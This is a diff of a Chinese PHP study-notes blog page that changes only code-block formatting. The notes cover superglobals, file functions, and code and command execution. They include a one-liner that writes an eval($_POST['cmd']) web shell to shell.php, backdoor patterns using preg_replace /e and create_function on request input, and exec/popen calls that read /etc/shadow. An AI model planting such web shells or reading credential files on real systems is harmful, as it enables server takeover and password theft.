@@ -7,27 +7,18 @@
 </ul>
 </li>
 </ul>
-<pre><code>1.    $_GET
-    此方式接收表单的method=&#39;get&#39;方式传递的值
-</code></pre><pre><code>2.    $_POST
-    此方式接收表单的method=&#39;post&#39;方式传递的值
-</code></pre><pre><code>3.    $_REQUEST
-    此方式接收表单get/post方式传递的值
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.	$_GET</span><br><span class="line">	此方式接收表单的method=&apos;get&apos;方式传递的值</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2.	$_POST</span><br><span class="line">	此方式接收表单的method=&apos;post&apos;方式传递的值</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.	$_REQUEST</span><br><span class="line">	此方式接收表单get/post方式传递的值</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>超全局变量$_SERVER：用于收集客户端请求信息</p>
-<pre><code>$_SERVER[&#39;SERVER_ADDR&#39;]        返回当前运行脚本所在的服务器的IP地址
-$_SERVER[&#39;REMOTE_ADDR&#39;]        返回浏览当前页面的用户的IP地址
-$_SERVER[&#39;SERVER_NAME&#39;]        服务器主机名
-$_SERVER[&#39;REMOTE_HOST&#39;]        用户的主机名
-$_SERVER[&#39;REMOTE_PORT&#39;]        用户连接到服务器的端口号
-$_SERVER[&#39;HTTP_HOST&#39;]        返回来自当前请求的Host头
-$_SERVER[&#39;HTTP_REFERER&#39;]    来源IP地址（从哪个IP地址跳转过来的）
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&apos;SERVER_ADDR&apos;]		返回当前运行脚本所在的服务器的IP地址</span><br><span class="line">$_SERVER[&apos;REMOTE_ADDR&apos;]		返回浏览当前页面的用户的IP地址</span><br><span class="line">$_SERVER[&apos;SERVER_NAME&apos;]		服务器主机名</span><br><span class="line">$_SERVER[&apos;REMOTE_HOST&apos;]		用户的主机名</span><br><span class="line">$_SERVER[&apos;REMOTE_PORT&apos;]		用户连接到服务器的端口号</span><br><span class="line">$_SERVER[&apos;HTTP_HOST&apos;]		返回来自当前请求的Host头</span><br><span class="line">$_SERVER[&apos;HTTP_REFERER&apos;]	来源IP地址（从哪个IP地址跳转过来的）</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 <h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><ul>
 <li><p><code>fopen()</code>：打开文件</p>
-<pre><code>fopen(文件名,打开文件的方式);
-</code></pre><ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fopen(文件名,打开文件的方式);</span><br></pre></td></tr></table></figure>
+<ul>
 <li>打开文件常用的方式：<ul>
 <li><code>r</code>：只读方式打开，指针位置在文件开头</li>
 <li><code>r+</code>：读写方式打开，指针位置在文件开头</li>
@@ -42,93 +33,81 @@ $_SERVER[&#39;HTTP_REFERER&#39;]    来源IP地址（从哪个IP地址跳转过�
 </ul>
 </li>
 <li><p><code>fgets()</code>：逐行读取文件，每次只读取一行</p>
-<pre><code>fgets(文件名);
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(文件名);</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>fread()</code>：按长度读取文件的内容</p>
-<pre><code>fread(文件名，长度);            换行也算一个长度
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fread(文件名，长度);			换行也算一个长度</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>fwrite()</code>：写入文件</p>
-<pre><code>fwrite(文件名，内容);
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fwrite(文件名，内容);</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>fputs</code>：<code>fwrite()</code>的别名</p>
 </li>
 <li><p><code>fclose()</code>：关闭一个打开的文件</p>
-<pre><code>fclose(文件名);
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fclose(文件名);</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>feof()</code>：检测指针是否已到达文件末尾</p>
 <ul>
 <li>可以结合while循环来读取文件中所有的内容</li>
 </ul>
-<pre><code>$file = fopen(&#39;a.txt&#39;,&#39;r&#39;);
-while(!feof($file))            //如果达到末尾，会返回TRUE
-{
-    echo fgets($file);
-}
-fclose($file);
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$file = fopen(&apos;a.txt&apos;,&apos;r&apos;);</span><br><span class="line">while(!feof($file))			//如果达到末尾，会返回TRUE</span><br><span class="line">&#123;</span><br><span class="line">    echo fgets($file);</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>unlink()</code>：删除文件</p>
 </li>
 <li><p><code>opendir()</code>：打开文件夹</p>
-<pre><code>$file = opendir(目录);
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = opendir(目录);</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>readdir()</code>：读取文件夹（从目录句柄中读取条目）</p>
-<pre><code>readdir($file);
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readdir($file);</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>closedir()</code>：关闭文件夹</p>
-<pre><code>closedir($file);
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">closedir($file);</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>file_exists()</code>：检查文件或目录是否存在</p>
 </li>
 <li><p><code>copy()</code>：复制文件</p>
-<pre><code>copy(源文件名,复制后的文件名);        可以移动的同时重命名文件
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy(源文件名,复制后的文件名);		可以移动的同时重命名文件</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>rename()</code>：重命名文件或目录</p>
-<pre><code>rename(源文件名,新文件名);
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename(源文件名,新文件名);</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>file_get_contents()</code>：把整个文件读入一个字符串中</p>
-<pre><code>file_get_contents(文件[,include_path,context,start,max_length])
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(文件[,include_path,context,start,max_length])</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>file_put_contents</code>：把一个字符串写入文件中</p>
-<pre><code>file_put_contents(string $filename,$data)
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(string $filename,$data)</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 <p>用文件操作写一句话：</p>
-<pre><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&#39;);?&gt;
-</code></pre><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt;&apos;);?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><ul>
 <li><p><code>eval()</code></p>
-<pre><code>函数里可以使用单引号或者双引号
-使用单引号：变量不转义
-使用双引号：变量被转义
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">函数里可以使用单引号或者双引号</span><br><span class="line">使用单引号：变量不转义</span><br><span class="line">使用双引号：变量被转义</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>assert()</code></p>
 </li>
 <li><p><code>preg_replace()</code>：正则里面使用<code>/e</code>模式</p>
-<pre><code>@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&#39;cmd&#39;],&quot;abcd&quot;);
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&apos;cmd&apos;],&quot;abcd&quot;);</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>create_function()</code>：创建函数</p>
-<pre><code>$func = create_function(&#39;&#39;,$_REQUEST[&#39;cmd&#39;]); $func();
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$func = create_function(&apos;&apos;,$_REQUEST[&apos;cmd&apos;]); $func();</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>$_GET[&#39;a&#39;]($_GET[&#39;b&#39;])</code>：动态创建函数</p>
-<pre><code>要求：PHP版本5.2以下才可以使用
-在地址栏中使用：a=assert&amp;b=phpinfo()    即可打印PHPinfo
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">要求：PHP版本5.2以下才可以使用</span><br><span class="line">在地址栏中使用：a=assert&amp;b=phpinfo()	即可打印PHPinfo</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul>
 <li><p>exec()：使用它必须在第二个参数指定一个变量来接收执行的命令</p>
-<pre><code>exec(&quot;cat /etc/shadow&quot;,$output);
-echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;; 
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;cat /etc/shadow&quot;,$output);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>system()：命令会直接执行，无需变量接收</p>
-<pre><code>system(&quot;phpinfo()&quot;);
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;phpinfo()&quot;);</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>popen()：此函数是打开一个进程，可读取此进程的结果</p>
-<pre><code>$file = popen(&quot;cat /etc/shadow&quot;,&#39;r&#39;);
-echo fread($file,5000);
-pclose($file);
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = popen(&quot;cat /etc/shadow&quot;,&apos;r&apos;);</span><br><span class="line">echo fread($file,5000);</span><br><span class="line">pclose($file);</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>shell_exec()：此函数需要一个变量在外接收它的结果并输出</p>
-<pre><code>$output = shell_exec(&#39;ls -al&#39;);
-echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = shell_exec(&apos;ls -al&apos;);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </div></header></article><div class="comments" id="lv-container" data-id="city" data-uid="your uid"><script>(function(d, s) {var j, e = d.getElementsByTagName(s)[0];if (typeof LivereTower === 'function') { return; } j = d.createElement(s);j.src = 'https://cdn-city.livere.com/js/embed.dist.js';j.async = true;e.parentNode.insertBefore(j, e);})(document, 'script');</script></div></main><footer class="foot"><div class="foot-copy">&copy; 2016-2018 xiaoli24680</div></footer><script src="/js/scroller.js"></script><script src="/js/main.js"></script></body></html>
